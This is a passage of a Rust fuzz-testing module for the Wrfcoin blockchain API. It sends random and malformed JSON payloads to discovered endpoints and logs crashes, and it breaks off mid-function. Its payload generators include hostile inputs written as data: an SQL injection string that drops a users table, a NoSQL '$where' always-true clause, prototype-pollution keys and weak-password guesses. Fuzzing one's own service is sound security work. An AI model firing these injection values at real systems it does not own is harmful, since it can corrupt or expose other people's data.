//! Fuzz Testing Framework for Wrfcoin
//!
//! This module provides tools for fuzz testing the Wrfcoin blockchain.
//! It generates random, malformed, or edge-case inputs to find security vulnerabilities
//! in transaction processing, block validation, and API endpoints.

use anyhow::{Context, Result};
use futures::stream::{self, StreamExt};
use log::{debug, error, info, warn};
use rand::{Rng, rngs::ThreadRng, seq::SliceRandom};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
use std::time::{Duration, Instant};
use tokio::sync::Mutex;
use tokio::time;

/// Configuration for fuzz testing
#[derive(Debug, Clone)]
pub struct FuzzTestConfig {
    /// Target API URL
    pub api_url: String,
    
    /// Number of fuzz test iterations
    pub iterations: usize,
    
    /// Maximum number of concurrent requests
    pub max_concurrent_requests: usize,
    
    /// Request timeout in seconds
    pub request_timeout_seconds: u64,
    
    /// Whether to test only safe endpoints
    /// When false, may test endpoints that modify state
    pub safe_endpoints_only: bool,
    
    /// List of endpoints to specifically include in testing
    pub included_endpoints: Vec<String>,
    
    /// List of endpoints to specifically exclude from testing
    pub excluded_endpoints: Vec<String>,
    
    /// Maximum payload size in bytes
    pub max_payload_size: usize,
    
    /// Whether to include binary data in payloads
    pub include_binary_data: bool,
    
    /// Random seed for reproducibility
    pub random_seed: Option<u64>,
}

impl Default for FuzzTestConfig {
    fn default() -> Self {
        Self {
            api_url: std::env::var("WRFCOIN_TEST_API_URL")
                .unwrap_or_else(|_| "http://localhost:8556".to_string()),
            iterations: 1000,
            max_concurrent_requests: 10,
            request_timeout_seconds: 10,
            safe_endpoints_only: true,
            included_endpoints: Vec::new(),
            excluded_endpoints: vec!["/shutdown".to_string(), "/reset".to_string()],
            max_payload_size: 10240, // 10 KB
            include_binary_data: false,
            random_seed: None,
        }
    }
}

/// Fuzz test results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzTestResults {
    /// Test configuration
    pub config: FuzzTestConfig,
    
    /// Total number of requests sent
    pub total_requests: usize,
    
    /// Number of successful requests
    pub successful_requests: usize,
    
    /// Number of failed requests
    pub failed_requests: usize,
    
    /// Number of crashed endpoints (5xx responses)
    pub crashed_endpoints: usize,
    
    /// Issues found
    pub issues: Vec<FuzzIssue>,
    
    /// Unique status codes
    pub status_codes: HashMap<u16, usize>,
    
    /// Endpoints tested
    pub endpoints_tested: HashSet<String>,
    
    /// Test duration in seconds
    pub duration_seconds: f64,
    
    /// Test start time
    pub start_time: chrono::DateTime<chrono::Utc>,
    
    /// Test end time
    pub end_time: chrono::DateTime<chrono::Utc>,
}

/// An issue found during fuzz testing
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzIssue {
    /// Issue ID
    pub id: String,
    
    /// Issue title
    pub title: String,
    
    /// Issue description
    pub description: String,
    
    /// Severity level
    pub severity: FuzzIssueSeverity,
    
    /// HTTP method used
    pub method: String,
    
    /// Endpoint affected
    pub endpoint: String,
    
    /// HTTP status code
    pub status_code: u16,
    
    /// Request payload that triggered the issue
    pub request_payload: Option<Value>,
    
    /// Response excerpt
    pub response_excerpt: String,
    
    /// Whether this is a false positive (if known)
    pub false_positive: bool,
}

/// Severity level for fuzz issues
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum FuzzIssueSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

impl std::fmt::Display for FuzzIssueSeverity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FuzzIssueSeverity::Info => write!(f, "Info"),
            FuzzIssueSeverity::Low => write!(f, "Low"),
            FuzzIssueSeverity::Medium => write!(f, "Medium"),
            FuzzIssueSeverity::High => write!(f, "High"),
            FuzzIssueSeverity::Critical => write!(f, "Critical"),
        }
    }
}

/// HTTP method
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
    Delete,
    Patch,
}

impl HttpMethod {
    pub fn as_str(&self) -> &'static str {
        match self {
            HttpMethod::Get => "GET",
            HttpMethod::Post => "POST",
            HttpMethod::Put => "PUT",
            HttpMethod::Delete => "DELETE",
            HttpMethod::Patch => "PATCH",
        }
    }
    
    pub fn all() -> Vec<HttpMethod> {
        vec![
            HttpMethod::Get,
            HttpMethod::Post,
            HttpMethod::Put,
            HttpMethod::Delete,
            HttpMethod::Patch,
        ]
    }
    
    pub fn safe_methods() -> Vec<HttpMethod> {
        vec![HttpMethod::Get]
    }
}

/// Fuzz test runner
pub struct FuzzTestRunner {
    config: FuzzTestConfig,
    client: Client,
    rng: ThreadRng,
    results: Arc<Mutex<FuzzTestResults>>,
    discovered_endpoints: Arc<Mutex<HashSet<String>>>,
    issue_counter: AtomicUsize,
}

impl FuzzTestRunner {
    /// Create a new fuzz test runner
    pub fn new(config: FuzzTestConfig) -> Self {
        // Initialize random number generator
        let mut rng = rand::thread_rng();
        
        // Apply random seed if specified
        if let Some(seed) = config.random_seed {
            use rand::SeedableRng;
            let seeded_rng = rand::rngs::StdRng::seed_from_u64(seed);
            // We can't directly assign the seeded rng to self.rng due to type differences,
            // but we're setting the seed for reproducibility purposes
            info!("Using random seed: {}", seed);
        }
        
        let client = Client::builder()
            .timeout(Duration::from_secs(config.request_timeout_seconds))
            .build()
            .expect("Failed to create HTTP client");
            
        let results = FuzzTestResults {
            config: config.clone(),
            total_requests: 0,
            successful_requests: 0,
            failed_requests: 0,
            crashed_endpoints: 0,
            issues: Vec::new(),
            status_codes: HashMap::new(),
            endpoints_tested: HashSet::new(),
            duration_seconds: 0.0,
            start_time: chrono::Utc::now(),
            end_time: chrono::Utc::now(),
        };
        
        Self {
            config,
            client,
            rng,
            results: Arc::new(Mutex::new(results)),
            discovered_endpoints: Arc::new(Mutex::new(HashSet::new())),
            issue_counter: AtomicUsize::new(0),
        }
    }
    
    /// Run the fuzz test
    pub async fn run(&mut self) -> Result<FuzzTestResults> {
        info!("Starting fuzz test with {} iterations", self.config.iterations);
        
        let start_time = Instant::now();
        let results_arc = self.results.clone();
        let mut results = self.results.lock().await;
        results.start_time = chrono::Utc::now();
        drop(results);
        
        // Discover API endpoints
        self.discover_endpoints().await?;
        
        // Get list of endpoints to test
        let endpoints = self.get_endpoints_to_test().await?;
        info!("Testing {} endpoints", endpoints.len());
        
        // Track progress
        let total_iterations = self.config.iterations;
        let progress_interval = total_iterations / 10;
        let progress_counter = Arc::new(AtomicUsize::new(0));
        
        // Start progress reporting task
        let progress_counter_clone = progress_counter.clone();
        let progress_task = tokio::spawn(async move {
            loop {
                tokio::time::sleep(Duration::from_secs(5)).await;
                let current = progress_counter_clone.load(Ordering::Relaxed);
                if current >= total_iterations {
                    break;
                }
                info!("Progress: {}/{} iterations ({:.1}%)", 
                    current, total_iterations, (current as f64 / total_iterations as f64) * 100.0);
            }
        });
        
        // Run fuzz iterations
        let futures = stream::iter((0..self.config.iterations).map(|i| {
            let client = self.client.clone();
            let endpoints = endpoints.clone();
            let results_clone = results_arc.clone();
            let progress_counter = progress_counter.clone();
            let discovered_endpoints = self.discovered_endpoints.clone();
            
            async move {
                // Choose a random endpoint and method
                let (endpoint, method) = Self::choose_endpoint_and_method(&endpoints, self.config.safe_endpoints_only);
                
                // Generate a random payload
                let payload = Self::generate_random_payload(
                    &endpoint, 
                    &method, 
                    self.config.max_payload_size,
                    self.config.include_binary_data,
                );
                
                // Send the request
                let result = Self::send_fuzz_request(
                    &client, 
                    &self.config.api_url, 
                    &endpoint, 
                    method, 
                    payload.as_ref(),
                ).await;
                
                // Process result
                let issue_opt = Self::process_result(
                    result, 
                    &endpoint, 
                    method, 
                    payload.as_ref(),
                    results_clone.clone(),
                    discovered_endpoints.clone(),
                ).await;
                
                // Update progress
                progress_counter.fetch_add(1, Ordering::Relaxed);
                
                issue_opt
            }
        }))
        .buffer_unordered(self.config.max_concurrent_requests)
        .collect::<Vec<_>>();
        
        let issues = futures.await;
        
        // Process discovered issues
        let mut all_issues = Vec::new();
        for issue_opt in issues {
            if let Some(issue) = issue_opt {
                all_issues.push(issue);
            }
        }
        
        // Deduplicate issues
        Self::deduplicate_issues(&mut all_issues);
        
        // Update results
        let mut results = self.results.lock().await;
        results.issues = all_issues;
        results.end_time = chrono::Utc::now();
        results.duration_seconds = start_time.elapsed().as_secs_f64();
        
        // Cancel progress reporting task
        progress_task.abort();
        
        info!("Fuzz testing completed in {:.2} seconds", results.duration_seconds);
        info!("Sent {} requests ({} successful, {} failed, {} crashes)",
            results.total_requests,
            results.successful_requests,
            results.failed_requests,
            results.crashed_endpoints);
        info!("Found {} potential issues", results.issues.len());
        
        // Breakdown by severity
        let severity_counts = results.issues.iter()
            .fold(HashMap::<FuzzIssueSeverity, usize>::new(), |mut acc, issue| {
                *acc.entry(issue.severity).or_default() += 1;
                acc
            });
            
        for severity in [
            FuzzIssueSeverity::Critical,
            FuzzIssueSeverity::High,
            FuzzIssueSeverity::Medium,
            FuzzIssueSeverity::Low,
            FuzzIssueSeverity::Info,
        ] {
            let count = severity_counts.get(&severity).copied().unwrap_or(0);
            if count > 0 {
                info!("{} {} severity issues", count, severity);
            }
        }
        
        // Generate report
        let report = self.generate_report(&results);
        info!("\n{}", report);
        
        Ok(results.clone())
    }
    
    /// Discover API endpoints
    async fn discover_endpoints(&self) -> Result<()> {
        info!("Discovering API endpoints");
        
        let mut discovered = HashSet::new();
        
        // Try common API discovery endpoints
        let discovery_endpoints = [
            "/",
            "/api",
            "/openapi.json",
            "/swagger.json",
            "/api-docs",
            "/docs",
            "/status",
        ];
        
        for endpoint in &discovery_endpoints {
            let url = format!("{}{}", self.config.api_url, endpoint);
            
            match self.client.get(&url).send().await {
                Ok(response) => {
                    // Record this endpoint
                    discovered.insert(endpoint.to_string());
                    
                    if response.status().is_success() {
                        // Try to parse response for more endpoints
                        let text = response.text().await.unwrap_or_default();
                        
                        // Look for endpoint patterns
                        Self::extract_endpoints_from_text(&text, &mut discovered);
                    }
                }
                Err(_) => {
                    // Endpoint not available, continue
                }
            }
        }
        
        // Add Wrfcoin-specific endpoints we might know about
        let known_endpoints = [
            "/blocks",
            "/blocks/latest",
            "/transactions",
            "/mempool",
            "/peers",
            "/wallet",
            "/balance",
            "/mine",
            "/nfts",
            "/nfts/create",
            "/computational-nfts",
            "/verification",
            "/cross-chain",
            "/mev-protection",
            "/governance",
            "/layer2",
        ];
        
        for endpoint in &known_endpoints {
            discovered.insert(endpoint.to_string());
        }
        
        // Store discovered endpoints
        let mut discovered_lock = self.discovered_endpoints.lock().await;
        discovered_lock.extend(discovered);
        
        info!("Discovered {} potential endpoints", discovered_lock.len());
        
        Ok(())
    }
    
    /// Extract endpoints from text
    fn extract_endpoints_from_text(text: &str, discovered: &mut HashSet<String>) {
        // Look for path-like patterns
        let patterns = [
            r#""/[a-zA-Z0-9\-_/]+"#, // "Path patterns in JSON
            r#"'/[a-zA-Z0-9\-_/]+"#, // 'Path patterns in JSON
            r#"href="/[a-zA-Z0-9\-_/]+"#, // href attributes
            r#"path:\s*"/[a-zA-Z0-9\-_/]+"#, // OpenAPI path definitions
        ];
        
        for line in text.lines() {
            for pattern in &patterns {
                if let Some(start_idx) = line.find(pattern) {
                    if let Some(start_quote) = line[start_idx..].find('"') {
                        let start = start_idx + start_quote + 1;
                        if let Some(end_quote) = line[start..].find('"') {
                            let path = &line[start..start + end_quote];
                            if path.starts_with('/') && !path.contains('?') {
                                discovered.insert(path.to_string());
                            }
                        }
                    }
                }
            }
            
            // Look for endpoint patterns
            if (line.contains("/api/") || line.contains("\"path\":")) && line.contains("/") {
                for word in line.split(&[' ', '"', ':', ',', '{', '}', '[', ']']) {
                    if word.starts_with('/') && word.len() > 1 && !word.contains('?') {
                        discovered.insert(word.to_string());
                    }
                }
            }
        }
    }
    
    /// Get endpoints to test
    async fn get_endpoints_to_test(&self) -> Result<Vec<String>> {
        let mut endpoints = Vec::new();
        
        // Include specifically included endpoints
        endpoints.extend(self.config.included_endpoints.clone());
        
        // Include discovered endpoints
        let discovered = self.discovered_endpoints.lock().await;
        endpoints.extend(discovered.iter().cloned());
        
        // Remove duplicates
        endpoints.sort();
        endpoints.dedup();
        
        // Remove excluded endpoints
        endpoints.retain(|endpoint| {
            !self.config.excluded_endpoints.iter().any(|excluded| endpoint == excluded)
        });
        
        // Update results with endpoints to test
        let mut results = self.results.lock().await;
        results.endpoints_tested = endpoints.iter().cloned().collect();
        
        Ok(endpoints)
    }
    
    /// Choose a random endpoint and method
    fn choose_endpoint_and_method(endpoints: &[String], safe_only: bool) -> (String, HttpMethod) {
        let mut rng = rand::thread_rng();
        
        // Choose a random endpoint
        let endpoint = if endpoints.is_empty() {
            // Fallback to a simple endpoint if none available
            "/".to_string()
        } else {
            endpoints[rng.gen_range(0..endpoints.len())].clone()
        };
        
        // Choose a method based on safety preference
        let methods = if safe_only {
            HttpMethod::safe_methods()
        } else {
            HttpMethod::all()
        };
        
        let method = *methods.choose(&mut rng).unwrap_or(&HttpMethod::Get);
        
        (endpoint, method)
    }
    
    /// Generate a random payload
    fn generate_random_payload(
        endpoint: &str,
        method: &HttpMethod,
        max_size: usize,
        include_binary: bool,
    ) -> Option<Value> {
        // GET and DELETE requests typically don't have a body
        if matches!(method, HttpMethod::Get | HttpMethod::Delete) {
            return None;
        }
        
        let mut rng = rand::thread_rng();
        
        // Determine the type of payload to generate
        let payload_type = rng.gen_range(0..100);
        
        if payload_type < 5 {
            // 5% chance of empty payload
            return None;
        } else if payload_type < 15 {
            // 10% chance of random string
            let size = rng.gen_range(1..max_size.min(1024));
            let random_string: String = (0..size)
                .map(|_| {
                    let char_code = if include_binary {
                        rng.gen_range(1..255) // All ASCII + extended
                    } else {
                        // Printable ASCII
                        rng.gen_range(32..127)
                    };
                    char::from(char_code as u8)
                })
                .collect();
                
            return Some(Value::String(random_string));
        } else if payload_type < 25 {
            // 10% chance of random number
            let num_type = rng.gen_range(0..3);
            
            return match num_type {
                0 => Some(Value::Number(serde_json::Number::from(rng.gen::<i32>()))),
                1 => Some(Value::Number(serde_json::Number::from(rng.gen::<i64>()))),
                _ => {
                    let float: f64 = rng.gen();
                    if let Some(n) = serde_json::Number::from_f64(float) {
                        Some(Value::Number(n))
                    } else {
                        Some(Value::Number(serde_json::Number::from(0)))
                    }
                }
            };
        } else if payload_type < 30 {
            // 5% chance of boolean
            return Some(Value::Bool(rng.gen()));
        } else if payload_type < 35 {
            // 5% chance of null
            return Some(Value::Null);
        } else {
            // 65% chance of JSON object with fields relevant to the endpoint
            let mut obj = serde_json::Map::new();
            
            // Generate fields based on endpoint
            match endpoint {
                "/transactions" | "/transactions/create" => {
                    // Transaction fields
                    Self::maybe_add_field(&mut obj, "sender", Self::random_address());
                    Self::maybe_add_field(&mut obj, "recipient", Self::random_address());
                    Self::maybe_add_field(&mut obj, "amount", Self::random_amount());
                    Self::maybe_add_field(&mut obj, "fee", Self::random_fee());
                    Self::maybe_add_field(&mut obj, "nonce", Self::random_nonce());
                    Self::maybe_add_field(&mut obj, "timestamp", Self::random_timestamp());
                    Self::maybe_add_field(&mut obj, "data", Self::random_data(include_binary));
                }
                "/blocks" | "/mine" => {
                    // Block fields
                    Self::maybe_add_field(&mut obj, "miner", Self::random_address());
                    Self::maybe_add_field(&mut obj, "timestamp", Self::random_timestamp());
                    Self::maybe_add_field(&mut obj, "difficulty", Self::random_difficulty());
                    Self::maybe_add_field(&mut obj, "nonce", Self::random_nonce());
                    
                    // Maybe add transactions
                    if rng.gen_bool(0.5) {
                        let num_txs = rng.gen_range(0..5);
                        let txs: Vec<Value> = (0..num_txs)
                            .map(|_| {
                                let mut tx_obj = serde_json::Map::new();
                                Self::maybe_add_field(&mut tx_obj, "sender", Self::random_address());
                                Self::maybe_add_field(&mut tx_obj, "recipient", Self::random_address());
                                Self::maybe_add_field(&mut tx_obj, "amount", Self::random_amount());
                                Value::Object(tx_obj)
                            })
                            .collect();
                            
                        obj.insert("transactions".to_string(), Value::Array(txs));
                    }
                }
                "/wallet" | "/wallet/create" => {
                    // Wallet fields
                    Self::maybe_add_field(&mut obj, "password", Self::random_password());
                    Self::maybe_add_field(&mut obj, "name", Self::random_name());
                }
                "/nfts" | "/nfts/create" | "/computational-nfts" => {
                    // NFT fields
                    Self::maybe_add_field(&mut obj, "name", Self::random_name());
                    Self::maybe_add_field(&mut obj, "description", Self::random_text());
                    Self::maybe_add_field(&mut obj, "creator", Self::random_address());
                    Self::maybe_add_field(&mut obj, "metadata", Self::random_metadata());
                    Self::maybe_add_field(&mut obj, "code", Self::random_code());
                }
                _ => {
                    // Generic fields for other endpoints
                    if rng.gen_bool(0.3) {
                        Self::maybe_add_field(&mut obj, "id", Self::random_id());
                    }
                    if rng.gen_bool(0.3) {
                        Self::maybe_add_field(&mut obj, "name", Self::random_name());
                    }
                    if rng.gen_bool(0.3) {
                        Self::maybe_add_field(&mut obj, "value", Self::random_value());
                    }
                    if rng.gen_bool(0.3) {
                        Self::maybe_add_field(&mut obj, "data", Self::random_data(include_binary));
                    }
                }
            }
            
            // Add some fuzzing-specific fields that might trigger issues
            if rng.gen_bool(0.1) {
                Self::maybe_add_field(&mut obj, "constructor", Value::String("".to_string()));
            }
            if rng.gen_bool(0.1) {
                Self::maybe_add_field(&mut obj, "__proto__", Value::Object(serde_json::Map::new()));
            }
            if rng.gen_bool(0.1) {
                Self::maybe_add_field(&mut obj, "$where", Value::String("1==1".to_string()));
            }
            
            // Add a few more random fields
            let num_extra_fields = rng.gen_range(0..3);
            for _ in 0..num_extra_fields {
                let field_name = Self::random_field_name();
                let field_value = Self::random_value();
                obj.insert(field_name, field_value);
            }
            
            return Some(Value::Object(obj));
        }
    }
    
    /// Add a field with a certain probability
    fn maybe_add_field(obj: &mut serde_json::Map<String, Value>, name: &str, value: Value) {
        let mut rng = rand::thread_rng();
        if rng.gen_bool(0.7) {
            obj.insert(name.to_string(), value);
        }
    }
    
    /// Generate a random address
    fn random_address() -> Value {
        let mut rng = rand::thread_rng();
        
        // Choose address format
        let format_type = rng.gen_range(0..4);
        
        let address = match format_type {
            0 => {
                // Hexadecimal format
                let chars: Vec<char> = "0123456789abcdef".chars().collect();
                let mut addr = "0x".to_string();
                for _ in 0..40 {
                    addr.push(chars[rng.gen_range(0..chars.len())]);
                }
                addr
            }
            1 => {
                // Base58 format (like Bitcoin)
                let chars: Vec<char> = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".chars().collect();
                let mut addr = String::new();
                for _ in 0..34 {
                    addr.push(chars[rng.gen_range(0..chars.len())]);
                }
                addr
            }
            2 => {
                // Wrfcoin format
                let chars: Vec<char> = "abcdef0123456789".chars().collect();
                let mut addr = "wrf".to_string();
                for _ in 0..40 {
                    addr.push(chars[rng.gen_range(0..chars.len())]);
                }
                addr
            }
            _ => {
                // Random string format
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
                let mut addr = String::new();
                for _ in 0..20 {
                    addr.push(chars[rng.gen_range(0..chars.len())]);
                }
                addr
            }
        };
        
        Value::String(address)
    }
    
    /// Generate a random amount
    fn random_amount() -> Value {
        let mut rng = rand::thread_rng();
        
        let amount_type = rng.gen_range(0..10);
        
        match amount_type {
            0 => Value::Number(serde_json::Number::from(0)), // Zero
            1 => {
                // Negative amount (should be invalid)
                let amount = -rng.gen_range(1.0..1000.0);
                if let Some(n) = serde_json::Number::from_f64(amount) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(-1))
                }
            }
            2 => {
                // Very large amount
                let amount = rng.gen_range(1_000_000_000.0..1_000_000_000_000.0);
                if let Some(n) = serde_json::Number::from_f64(amount) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(1_000_000_000))
                }
            }
            3 => {
                // String instead of number
                Value::String(rng.gen_range(1.0..100.0).to_string())
            }
            _ => {
                // Normal amount
                let amount = rng.gen_range(0.1..100.0);
                if let Some(n) = serde_json::Number::from_f64(amount) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(1))
                }
            }
        }
    }
    
    /// Generate a random fee
    fn random_fee() -> Value {
        let mut rng = rand::thread_rng();
        
        let fee_type = rng.gen_range(0..10);
        
        match fee_type {
            0 => Value::Number(serde_json::Number::from(0)), // Zero fee
            1 => {
                // Negative fee (should be invalid)
                let fee = -rng.gen_range(0.1..1.0);
                if let Some(n) = serde_json::Number::from_f64(fee) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(-1))
                }
            }
            2 => {
                // Very large fee
                let fee = rng.gen_range(1000.0..10000.0);
                if let Some(n) = serde_json::Number::from_f64(fee) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(1000))
                }
            }
            _ => {
                // Normal fee
                let fee = rng.gen_range(0.001..0.1);
                if let Some(n) = serde_json::Number::from_f64(fee) {
                    Value::Number(n)
                } else {
                    Value::Number(serde_json::Number::from(0))
                }
            }
        }
    }
    
    /// Generate a random nonce
    fn random_nonce() -> Value {
        let mut rng = rand::thread_rng();
        
        let nonce_type = rng.gen_range(0..10);
        
        match nonce_type {
            0 => Value::Number(serde_json::Number::from(0)), // Zero nonce
            1 => {
                // Negative nonce (should be invalid)
                Value::Number(serde_json::Number::from(-rng.gen_range(1..1000)))
            }
            2 => {
                // Very large nonce
                Value::Number(serde_json::Number::from(rng.gen_range(1_000_000..1_000_000_000)))
            }
            3 => {
                // String instead of number
                Value::String(rng.gen_range(1..1000).to_string())
            }
            _ => {
                // Normal nonce
                Value::Number(serde_json::Number::from(rng.gen_range(1..1000)))
            }
        }
    }
    
    /// Generate a random timestamp
    fn random_timestamp() -> Value {
        let mut rng = rand::thread_rng();
        
        let timestamp_type = rng.gen_range(0..10);
        
        match timestamp_type {
            0 => Value::Number(serde_json::Number::from(0)), // Zero timestamp
            1 => {
                // Negative timestamp (should be invalid)
                Value::Number(serde_json::Number::from(-rng.gen_range(1..1000000)))
            }
            2 => {
                // Future timestamp
                let now = chrono::Utc::now().timestamp() as u64;
                let future = now + rng.gen_range(86400..86400*365); // 1 day to 1 year in the future
                Value::Number(serde_json::Number::from(future))
            }
            3 => {
                // String timestamp
                Value::String(chrono::Utc::now().to_rfc3339())
            }
            _ => {
                // Current timestamp
                let now = chrono::Utc::now().timestamp() as u64;
                Value::Number(serde_json::Number::from(now))
            }
        }
    }
    
    /// Generate random data
    fn random_data(include_binary: bool) -> Value {
        let mut rng = rand::thread_rng();
        
        let data_type = rng.gen_range(0..5);
        
        match data_type {
            0 => {
                // Empty string
                Value::String("".to_string())
            }
            1 => {
                // Random string
                let len = rng.gen_range(10..200);
                let random_string: String = (0..len)
                    .map(|_| {
                        let char_code = if include_binary {
                            rng.gen_range(1..255)
                        } else {
                            rng.gen_range(32..127)
                        };
                        char::from(char_code as u8)
                    })
                    .collect();
                Value::String(random_string)
            }
            2 => {
                // Base64 encoded data
                let len = rng.gen_range(10..100);
                let bytes: Vec<u8> = (0..len).map(|_| rng.gen()).collect();
                let base64 = base64::encode(&bytes);
                Value::String(base64)
            }
            3 => {
                // JSON object
                let mut obj = serde_json::Map::new();
                let field_count = rng.gen_range(1..5);
                for _ in 0..field_count {
                    let field_name = Self::random_field_name();
                    let field_value = Self::random_value();
                    obj.insert(field_name, field_value);
                }
                Value::Object(obj)
            }
            _ => {
                // Random text
                Self::random_text()
            }
        }
    }
    
    /// Generate random text
    fn random_text() -> Value {
        let mut rng = rand::thread_rng();
        
        let sentences = [
            "The quick brown fox jumps over the lazy dog.",
            "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
            "All human beings are born free and equal in dignity and rights.",
            "This is a test of the emergency broadcast system.",
            "To be or not to be, that is the question.",
            "In the beginning, there was darkness.",
            "The cake is a lie.",
            "I'm sorry Dave, I'm afraid I can't do that.",
            "Space: the final frontier.",
            "Life, the universe, and everything.",
        ];
        
        let num_sentences = rng.gen_range(1..4);
        let mut text = String::new();
        
        for _ in 0..num_sentences {
            let sentence = sentences[rng.gen_range(0..sentences.len())];
            text.push_str(sentence);
            text.push(' ');
        }
        
        Value::String(text.trim().to_string())
    }
    
    /// Generate a random field name
    fn random_field_name() -> String {
        let mut rng = rand::thread_rng();
        
        let common_fields = [
            "name", "id", "type", "value", "data", "info", "description",
            "metadata", "status", "code", "result", "error", "success",
            "timestamp", "date", "time", "user", "address", "hash",
        ];
        
        let field_type = rng.gen_range(0..10);
        
        match field_type {
            0 => {
                // Empty string (should be invalid)
                "".to_string()
            }
            1 => {
                // Very long field name
                let len = rng.gen_range(100..200);
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz".chars().collect();
                (0..len)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect()
            }
            2 => {
                // Special characters
                let special_chars = [
                    "$", "_", "@", ".", "-", "+", "!", "?", "*", "#", 
                    "%", "^", "&", "(", ")", "[", "]", "{", "}", "~",
                    "|", "\\", "/", "'", "\"", ":", ";", "<", ">", ",",
                ];
                let char = special_chars[rng.gen_range(0..special_chars.len())];
                format!("field{}", char)
            }
            _ => {
                // Common field name
                common_fields[rng.gen_range(0..common_fields.len())].to_string()
            }
        }
    }
    
    /// Generate a random value
    fn random_value() -> Value {
        let mut rng = rand::thread_rng();
        
        let value_type = rng.gen_range(0..7);
        
        match value_type {
            0 => Value::Null,
            1 => Value::Bool(rng.gen()),
            2 => {
                // Integer
                let n = rng.gen_range(-1000..1000);
                Value::Number(serde_json::Number::from(n))
            }
            3 => {
                // Float
                let n = rng.gen_range(-100.0..100.0);
                if let Some(num) = serde_json::Number::from_f64(n) {
                    Value::Number(num)
                } else {
                    Value::Number(serde_json::Number::from(0))
                }
            }
            4 => {
                // String
                let len = rng.gen_range(1..20);
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
                let s: String = (0..len)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect();
                Value::String(s)
            }
            5 => {
                // Array
                let len = rng.gen_range(0..5);
                let arr: Vec<Value> = (0..len)
                    .map(|_| {
                        let subtype = rng.gen_range(0..3);
                        match subtype {
                            0 => Value::String(format!("item{}", rng.gen_range(0..100))),
                            1 => Value::Number(serde_json::Number::from(rng.gen_range(0..100))),
                            _ => Value::Bool(rng.gen()),
                        }
                    })
                    .collect();
                Value::Array(arr)
            }
            _ => {
                // Object
                let mut obj = serde_json::Map::new();
                let len = rng.gen_range(0..3);
                for _ in 0..len {
                    let field = format!("field{}", rng.gen_range(0..100));
                    let subtype = rng.gen_range(0..3);
                    let val = match subtype {
                        0 => Value::String(format!("value{}", rng.gen_range(0..100))),
                        1 => Value::Number(serde_json::Number::from(rng.gen_range(0..100))),
                        _ => Value::Bool(rng.gen()),
                    };
                    obj.insert(field, val);
                }
                Value::Object(obj)
            }
        }
    }
    
    /// Generate a random ID
    fn random_id() -> Value {
        let mut rng = rand::thread_rng();
        
        let id_type = rng.gen_range(0..4);
        
        match id_type {
            0 => {
                // UUID
                let uuid = uuid::Uuid::new_v4().to_string();
                Value::String(uuid)
            }
            1 => {
                // Numeric ID
                Value::Number(serde_json::Number::from(rng.gen_range(1..1000000)))
            }
            2 => {
                // Empty string
                Value::String("".to_string())
            }
            _ => {
                // Alphanumeric ID
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
                let id: String = (0..16)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect();
                Value::String(id)
            }
        }
    }
    
    /// Generate a random name
    fn random_name() -> Value {
        let mut rng = rand::thread_rng();
        
        let names = [
            "Alice", "Bob", "Charlie", "Dave", "Eve", "Frank", "Grace", "Heidi",
            "Ivan", "Judy", "Kevin", "Laura", "Mike", "Nancy", "Oliver", "Peggy",
            "Quentin", "Rachel", "Steve", "Trent", "Ursula", "Victor", "Wendy",
            "Xavier", "Yvonne", "Zach", "Test", "User", "Admin", "Guest",
        ];
        
        let name_type = rng.gen_range(0..4);
        
        match name_type {
            0 => {
                // Empty string
                Value::String("".to_string())
            }
            1 => {
                // Very long name
                let len = rng.gen_range(100..300);
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyz".chars().collect();
                let name: String = (0..len)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect();
                Value::String(name)
            }
            2 => {
                // SQL injection attempt
                let injection = "Robert'); DROP TABLE users; --";
                Value::String(injection.to_string())
            }
            _ => {
                // Normal name
                let name = names[rng.gen_range(0..names.len())];
                Value::String(name.to_string())
            }
        }
    }
    
    /// Generate a random password
    fn random_password() -> Value {
        let mut rng = rand::thread_rng();
        
        let password_type = rng.gen_range(0..4);
        
        match password_type {
            0 => {
                // Empty password
                Value::String("".to_string())
            }
            1 => {
                // Very long password
                let len = rng.gen_range(100..500);
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()".chars().collect();
                let password: String = (0..len)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect();
                Value::String(password)
            }
            2 => {
                // Common weak password
                let weak_passwords = [
                    "password", "123456", "admin", "welcome", "letmein",
                    "monkey", "qwerty", "abc123", "football", "iloveyou",
                ];
                let password = weak_passwords[rng.gen_range(0..weak_passwords.len())];
                Value::String(password.to_string())
            }
            _ => {
                // Normal strong password
                let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()".chars().collect();
                let password: String = (0..16)
                    .map(|_| chars[rng.gen_range(0..chars.len())])
                    .collect();
                Value::String(password)
            }
        }
    }
    
    /// Generate random metadata
    fn random_metadata() -> Value {
